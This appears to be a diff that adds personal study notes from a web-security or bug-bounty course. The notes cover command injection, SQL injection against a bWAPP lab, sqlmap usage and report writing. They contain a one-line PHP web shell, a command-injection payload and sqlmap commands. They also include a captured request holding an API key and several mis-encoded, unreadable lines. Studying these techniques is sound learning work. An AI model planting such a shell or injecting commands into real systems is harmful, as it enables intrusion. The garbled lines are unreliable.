@@ -1,0 +1,105 @@
+session 6 :::
+
+
+Session :
+
+https://www.digwebinterface.com/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+
+
+-OS Command Injection
+
+<?php
+system($_POST['cmd']);
+?>
+
+
+<?php
+system('whois $GET																																																																																																																																																							);
+?>
+
+www.nsa.gov
+www.nsa.gov; ls
+
+-SQL Injection (GET/Select)
+
+http://192.168.1.24/bWAPP/sqli_2.php?movie=1&action=go
+http://192.168.1.24/bWAPP/sqli_2.php?movie=1%27&action=go
+
+in ubuntu : git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+$ ls
+$ cd sqlmap-dev
+$ ls
+$ python sqlmap.py -u
+
+in file text in ununtu
+(((((
+GET /v4/threatListUpdates:fetch?$ct=application/x-protobuf&key=AIzaSyD_Drzahe4dBzGCZ9ArvowCvrPx_yFrlCM&$httpMethod=POST&$req=ChUKE25hdmNsaWVudC1hdXRvLWZmb3gaJwgFEAEaGwoNCAUQBhgBIgMwMDEwARDYugQaAhgEQ0jjiyICIAIoARonCAEQARobCg0IARAGGAEiAzAwMTABELWtBBoCGASy4KmyIgIgAigBGicIAxABGhsKDQgDEAYYASIDMDAxMAEQ56AEGgIYBPRU2_QiAiACKAEaCggHEAEiAiACKAEaJQgJEAEaGQoNCAkQBhgBIgMwMDEwARAKGgIYBOuKeJoiAiACKAE= HTTP/1.1
+Host: safebrowsing.googleapis.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-HTTP-Method-Override: POST
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+)))))
+
+
+$ sqlmap -r test.txt
+ 
+yes yes
+
+domp no œÌÂ ›ÌÂ« ”Ã‰
+
+
+-Server Side Request Forgery (SSRF)
+„‘ ﬂ Ì— ·«‰Ï „›Ì‘ „Êﬁ⁄ »Ì‘Ê› „Êﬁ⁄Â ‘€«· Ê·Â ·«
+
+
+-XML External Entity Attacks (XXE)
+ ⁄ „œ ⁄·Ï Õ«Ã Ì‰
+File upload
+R3
+
+
+Report:
+https://www.hackerone.com/
+https://www.bugcrowd.com/ for beginner
+https://bugcrowd.com/vulnerability-rating-taxonomy rules
+
+****report****
+Description
+
+POC
+
+sadsad
+
+Ref
+
+Impact
+
+
+this make make interview:
+https://www.synack.com/red-team/
+
+for make test for beginner :
+eset nod32
+
+Steps for test :
+subdomains
+use website as a user
+one by one subdomain test
+---
+IDOR
+XSS
+SQL
+RCE
+File upload , parameter
+
+book Webhacking 101
+
+scure masr
